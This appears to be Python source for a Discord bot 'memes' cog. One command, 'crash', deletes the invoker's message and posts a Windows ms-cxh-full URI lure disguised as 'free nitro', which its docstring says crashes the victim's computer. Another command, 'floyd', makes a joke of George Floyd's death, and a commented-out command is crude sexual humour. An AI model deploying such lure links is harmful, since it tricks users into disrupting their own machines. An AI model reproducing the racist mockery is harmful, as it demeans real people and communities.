import discord
import asyncio
from discord.ext import commands
import random

class memes(commands.Cog):
    """m e m e s but make them dark"""

    def __init__(self, bot):
        self.bot = bot


#    @commands.command(aliases=["pp", "size", "penislenght"])
#    async def ppsize(self, ctx, message, member: discord.Member):
#        """Tells you the penis size of the mentioned user
#
#        Parameters
#        • user - Do i need to fucking explain this """
#
#        sz = random.randint(0,16)
#        usr =

    @commands.command()
    async def floyd(self, ctx):
        """I can't breathe"""
        await ctx.message.delete()
        await ctx.send("https://i.imgur.com/mn3EslL.png")


    @commands.command()
    async def crash(self, ctx):
        """Sends a link when clicked rapes a windwos computer"""
        await ctx.message.delete()
        await ctx.send("Click this for free nitro! <ms-cxh-full://0>")


### Add cog again
def setup(bot):
    bot.add_cog(memes(bot))
